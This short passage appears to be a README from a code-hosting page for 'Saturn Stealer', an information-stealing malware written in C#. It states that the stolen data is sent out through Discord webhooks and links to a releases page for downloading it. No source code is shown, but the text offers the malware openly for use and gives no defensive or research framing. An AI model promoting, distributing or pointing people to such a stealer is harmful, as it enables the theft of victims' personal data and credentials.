...
Saturn Stealer is a fast, lightweight stealer written in C#. The collected data is transferred through discord webhooks.
...
## Download
Head over to the [releases](https://github.com/HyperMoud/Saturn-Grabber/releases/tag/1.40) tab to download the latest version of Saturn Stealer.
